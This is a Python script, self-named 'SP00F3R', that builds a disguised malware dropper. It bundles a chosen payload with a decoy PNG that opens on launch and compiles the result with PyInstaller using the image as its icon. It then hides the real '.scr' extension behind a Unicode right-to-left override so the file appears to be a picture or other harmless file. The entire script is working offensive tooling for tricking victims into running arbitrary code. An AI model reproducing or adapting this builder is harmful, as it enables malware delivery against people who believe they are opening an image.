import os
import shutil
from PIL import Image
import random as r
import string

os.chdir('src')

MODE = input('Mode: [PNG,CUSTOM]\n> ').lower()
if MODE == 'png':
    PNG = input('PNG filepath:\n> ')
    spoofed_extension = 'png'
    iconfile = PNG
if MODE == 'zip':
    PNG = input('ZIP file to spoof:\n> ')
    spoofed_extension = 'zip'
    iconfile = 'zip.png'
if MODE == 'custom':
    PNG = input('PNG filepath:\n> ')
    spoofed_extension = input('Extension to spoof:\n> ')
    iconfile = input('PNG to use for icon:\n> ')

PAYLOAD = input('Payload filepath:\n> ')

with open(PNG,'rb') as f: content = f.read()

spoofed_filepath = f'{''.join([r.choice(string.ascii_lowercase) for _ in range(7)])}‮{spoofed_extension[::-1]}.scr'

### STAGE 1

shutil.copyfile(PAYLOAD,'payload.py')

out = []
out.append('### SP00F3R INFUSED FILE ###')
out.append('### SP00F3R - Modern File Spoofing framework ###')
out.append('import tempfile, os')
out.append('import payload')
out.append(f'data = b"""{f'{content}'.removeprefix("b'").removesuffix("'")}"""')
out.append(f"file = '{PNG}'")
out.append('temp = tempfile.mkdtemp()')
out.append('with open(f"{temp}/{file}","wb") as f: f.write(data)')
out.append('os.system(f"start /min cmd /c start {temp}/{file}")')

# Try remove old ones
try: os.remove('STAGE_1.py')
except: pass

# Write shit
with open('STAGE_1.py','a') as f:
    for i in out:
        f.write(f'{i}\n')


### STAGE 2 (spoof)

## SPOOF ICON
Image.open(iconfile).save('icon.ico',format='ico') # Transform to ico


## Pyinstaller it (i hope it works)
os.system('pyinstaller --onefile --specpath build/spec --workpath "build" --distpath "." --windowed --icon "icon.ico" STAGE_1.py')


## SPOOF EXTENSION
try: os.remove(spoofed_filepath)
except: pass
os.rename('STAGE_1.exe',spoofed_filepath)


### Clean up
os.remove('STAGE_1.py')
os.remove('payload.py')
os.remove('icon.ico')

print('### SP00F3R INJECTION COMPLETED ###')

